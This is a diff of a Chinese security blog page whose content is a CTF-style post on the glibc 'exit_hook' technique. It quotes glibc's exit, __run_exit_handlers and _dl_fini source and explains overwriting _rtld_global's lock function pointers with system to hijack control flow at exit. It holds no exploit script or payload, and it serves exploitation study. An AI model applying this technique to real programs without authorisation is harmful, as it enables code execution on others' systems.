@@ -145,198 +145,286 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">exit_hook</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-06-18 15:27:49
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/">堆利用</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>18 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>众所周知的俩hook在glibc2.34移除了，不过exit_hook好像在这个版本的glibc表现得也不是很佳，不过在近期遇到的两道题目都需要用到这方面的知识所以来补了。</p>
+<h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h2><p>首先呢，程序正常退出以及使用exit函数都会调用exit所以不仅限于存在exit的题目适合</p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function">    <span class="title">exit</span> <span class="params">(<span class="keyword">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure>
+
+<p>exit函数就只是单纯的调用了另一个函数，重点还是在另一个函数上面</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">    attribute_hidden</span><br><span class="line">    __run_exit_handlers (<span class="keyword">int</span> status, struct exit_function_list **listp,</span><br><span class="line">                         <span class="keyword">bool</span> run_list_atexit, <span class="keyword">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span> (run_dtors)</span><br><span class="line">            __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">        __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">        restart:</span><br><span class="line">        cur = *listp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">	     atexit/on_exit registrations.  */</span></span><br><span class="line">            __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">            __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">            __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">            <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">                    <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">                    <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ef_free:</span><br><span class="line">                <span class="keyword">case</span> ef_us:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_on:</span><br><span class="line">                    onfct = f-&gt;func.on.fn;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (onfct);</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                    onfct (status, f-&gt;func.on.arg);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_at:</span><br><span class="line">                    atfct = f-&gt;func.at;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (atfct);</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                    atfct ();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> ef_cxa:</span><br><span class="line">                    <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">                    f-&gt;flavor = ef_free;</span><br><span class="line">                    cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">                    PTR_DEMANGLE (cxafct);</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                    cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Re-lock again before looking at global state.  */</span></span><br><span class="line">            __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">                <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">	       more exit functions.  Start the loop over.  */</span></span><br><span class="line">                <span class="keyword">goto</span> restart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">            <span class="built_in">free</span> (cur);</span><br><span class="line"></span><br><span class="line">        __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">    _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先将源码放在这里，因为但看源码看不出什么</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220616184018220.png"
+                      alt="image-20220616184018220"
+                ></p>
+<p>但是通过调试可以看到这里是调用了_dl_fini函数，而这个函数在<a href="https://cv196082.gitee.io/2022/03/07/house-of-banana/">house of banana</a>中提到过并且适用libc的版本还挺高在glibc2.34都是可以使用的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">    _dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">    again:</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line">            <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">            || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">            __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">            struct link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">            assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">                <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">                <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">                &#123;</span><br><span class="line">                    assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">                    maps[i] = l;</span><br><span class="line">                    l-&gt;l_idx = i;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">                    ++l-&gt;l_direct_opencount;</span><br><span class="line">                &#125;</span><br><span class="line">            assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">            assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">	     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">	     the main namespace.  */</span></span><br><span class="line">            _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">                           <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">            __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">                    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">                    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">                        || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                                              &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                            _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                                              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                                              ns);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">                                (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                            <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                              / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                                ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI</span><br><span class="line">                            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">                    <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">                    <span class="keyword">if</span> (!do_audit &amp;&amp; __builtin_expect (GLRO(dl_naudit) &gt; <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="class"><span class="keyword">struct</span> <span class="title">audit_ifaces</span> *<span class="title">afct</span> =</span> GLRO(dl_audit);</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> cnt = <span class="number">0</span>; cnt &lt; GLRO(dl_naudit); ++cnt)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (afct-&gt;objclose != <span class="literal">NULL</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> *<span class="title">state</span></span></span><br><span class="line"><span class="class">                                    =</span> link_map_audit_state (l, cnt);</span><br><span class="line">                                <span class="comment">/* Return value is ignored.  */</span></span><br><span class="line">                                (<span class="keyword">void</span>) afct-&gt;objclose (&amp;state-&gt;cookie);</span><br><span class="line">                            &#125;</span><br><span class="line">                            afct = afct-&gt;next;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        do_audit = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">        _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">                          <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">                          <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">                          GL(dl_num_relocations),</span><br><span class="line">                          GL(dl_num_cache_relocations));</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面就是_dl_fini函数，这次重点关注的是这一段代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">        || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面给出两种函数的定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出来这里是将_rtld_global当中的属性当作函数来进行调用的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220616185021145.png"
+                      alt="image-20220616185021145"
+                ></p>
+<p>然而这俩属性也就是俩指针，所以我们可以修改这个指针到system，接着就是构造参数了。根据上面的调用关系可以看到最后的参数其实是</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220616185259054.png"
+                      alt="image-20220616185259054"
+                ></p>
+<p>以上其实就是exit_hook的全部了，很简单。</p>
